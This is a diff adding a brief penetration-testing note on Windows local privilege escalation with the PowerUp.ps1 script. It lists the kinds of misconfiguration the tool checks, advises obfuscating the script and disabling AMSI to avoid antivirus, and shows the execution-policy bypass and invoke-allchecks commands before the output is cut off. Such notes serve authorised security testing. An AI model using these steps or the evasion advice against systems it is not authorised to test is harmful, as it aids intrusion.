@@ -1,6 +1,28 @@
+=============================================================================================
+Windows local privilege escalation attack using PowerUP
+=============================================================================================
 
-import-module .\PowerUp.ps1
-invoke-allchecks
+Link: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
+
+The Powershell script 'PowerUp.ps1' aims to be a clearing-house of common Windows privilege escalation vectors that rely on misconfiguration.
+It can be used to both detect and exploit common privilege escalation flaws.
+Examples:
+  + Token/Privilege Enumeration/Abuse
+	+ Service Enumeration and abuse
+	+ DLL Hijacking
+	+ Registry Checks
+	+ Miscellaneous Checks
+  + ...
+
+Important note: Before running the PowerUP script it is important to obfuscate it a little and to disable the AMSI to avoid AV.
+
+=============================================================================================
+Example - Output of the script using the 'invoke-allchecks' command as a low-privileged user
+=============================================================================================
+
+PS C:\> powershell -ep bypass
+PS C:\> import-module .\PowerUp.ps1
+PS C:\> invoke-allchecks
 
 [*] Running Invoke-AllChecks
 [*] Checking if user is in a local group with administrative privileges...
